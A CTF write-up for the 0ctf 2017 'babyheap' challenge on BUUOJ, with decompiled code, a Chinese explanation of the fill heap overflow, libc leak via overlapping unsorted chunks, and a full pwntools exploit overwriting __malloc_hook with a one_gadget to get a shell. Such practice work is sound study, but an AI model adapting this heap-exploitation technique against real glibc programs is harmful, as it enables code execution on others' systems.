# BUU-babyheap_0ctf_2017

## checksec

```shell
[*] '/home/niebelungen/Desktop/buu/babyheap/babyheap_0ctf_2017'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

**add**

```c
void __fastcall sub_D48(__int64 a1, __int64 a2)
{
  int i; // [rsp+10h] [rbp-10h]
  int v3; // [rsp+14h] [rbp-Ch]
  void *v4; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v3 = sub_138C("Size: ", a2);
      if ( v3 > 0 )
      {
        if ( v3 > 4096 )
          v3 = 4096;
        v4 = calloc(v3, 1uLL);
        if ( !v4 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v3;
        *(_QWORD *)(a1 + 24LL * i + 16) = v4;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

**fill**

```c
__int64 __fastcall sub_E7F(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (int)result >= 0 && (int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = sub_138C();
      v3 = result;
      if ( (int)result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

**free**：将标志位清零，指针清零

**dump**：输出内容

漏洞是在`fill`时可以进行堆溢出，首先想办法leak libc。可以申请任意大小的chunk，unsorted bin中的chunk，其fd和bk都会指向`main_arena`，而`main——arena`是在libc中的，可以通过这一点进行leak。

另一个点是申请chunk时，使用的是`calloc`会对chunk中的内容进行清空。所以，想到利用`overlapping chunk`，在一个chunk中包含一个unsorted chunk，将其free，再输出chunk的内容，就可以leak。这里我们申请后，要覆盖的chunk的head已经被清空了，所以还要恢复其头部信息。我们没有对这个chunk进行修改，它也没有`prev_size`域，所以只要保持size是原值就行。

控制执行流，我们没有办法控制栈内容，所以想到`__malloc_hook`，通过`house_of_spirit`申请到`__malloc_hook`附近的chunk，对其进行覆盖。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, addr))
context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./babyheap_0ctf_2017'
#gdb.attach(p)
if local:
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',27982)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.271.so')

def alloc(size):
    sh.sendline('1')
    sh.recvuntil('Size:')
    sh.sendline(str(size))
    #sh.recvuntil('Allocate Index ')
    
def fill(index, size, content):
    sh.sendline('2')
    sh.recvuntil('Index: ')
    sh.sendline(str(index))
    sh.recvuntil('Size:')
    sh.sendline(str(size))
    sh.recvuntil('Content: ')
    sh.sendline(str(content))
    
def free(index):
    sh.sendline('3')
    sh.recvuntil('Index: ')
    sh.sendline(str(index))
    
def dump(index):
    sh.sendline('4')
    sh.recvuntil('Index: ')
    sh.sendline(str(index))

one_gadget =[0x45216,0x4526a,0xf02a4,0xf1147]

#gdb.attach(sh)
alloc(0x100) #0
alloc(0x100) #1
alloc(0x80) #2
alloc(0x10) #3 

#leak libc
payload = 'a'*0x100+'a'*8+p64(0x1a1)
free(1)
fill(0, len(payload), payload)
alloc(0x190) #1
payload = 'a'*0x100+p64(0x00)+p64(0x91)
fill(1, len(payload), payload)
free(2)
dump(1)
main_arena = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
malloc_hook = main_arena -88 - 0x10
fake_chunk = malloc_hook -0x23
libc_base=main_arena-88-0x3C4B20 
one = libc_base + one_gadget[1]
leak('main_arena', hex(main_arena))
leak('malloc_hook',hex(malloc_hook))
leak('fake_chunk', hex(fake_chunk))
leak('libc_base', hex(libc_base))
alloc(0x80)
#gdb.attach(sh)
alloc(0x60) #4
alloc(0x10) #5
free(4)
payload = p64(0)*3+p64(0x71)+p64(fake_chunk)
fill(3, len(payload), payload)

alloc(0x60) #4
alloc(0x60) #6
payload = 'a'*0x13+p64(one)
fill(6,len(payload),payload)
alloc(0x10) #7

sh.interactive()
```



